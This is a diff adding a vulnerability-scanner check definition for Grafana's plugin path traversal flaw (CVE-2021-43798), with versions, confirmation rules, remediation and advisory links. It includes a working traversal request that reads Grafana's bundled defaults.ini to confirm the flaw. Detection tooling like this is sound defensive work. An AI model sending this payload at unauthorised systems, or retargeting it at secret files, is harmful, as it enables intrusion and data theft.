@@ -1,0 +1,36 @@
+id: grafana-plugin-path-traversal-flow
+title: Grafana plugin path traversal (flow)
+cve: CVE-2021-43798
+cvss: 7.5
+severity: high
+category: observability
+engine: module
+match:
+  service: grafana
+  versions: ">=8.0.0 <8.0.7 || >=8.1.0 <8.1.8 || >=8.2.0 <8.2.7 || >=8.3.0 <8.3.1"
+# Module-engine flow: confirm the traversal actively but non-destructively.
+# Step 1 fingerprints Grafana via the unauthenticated frontend settings API.
+# Step 2 uses the documented /public/plugins/<id>/ traversal to read Grafana's
+# OWN bundled config (conf/defaults.ini) — an application-owned, read-only file,
+# not host secrets. A patched build returns 404; a vulnerable build returns the
+# ini contents, confirming the path traversal without touching sensitive data.
+flow:
+  requests:
+    - id: fingerprint
+      method: GET
+      path: /api/frontend/settings
+    - id: traversal
+      method: GET
+      path: /public/plugins/alertlist/../../../../../../../../conf/defaults.ini
+  confirm:
+    - "status(fingerprint) == 200"
+    - "status(traversal) == 200"
+    - "body(traversal) contains '[paths]'"
+remediation: |
+  Upgrade Grafana to >=8.3.1 (or the patched release on your branch: 8.2.7,
+  8.1.8, 8.0.7). If you cannot upgrade, front Grafana with a reverse proxy that
+  normalizes the request path, and remove the instance from internet exposure.
+references:
+  - https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p
+  - https://nvd.nist.gov/vuln/detail/CVE-2021-43798
+signature: stub
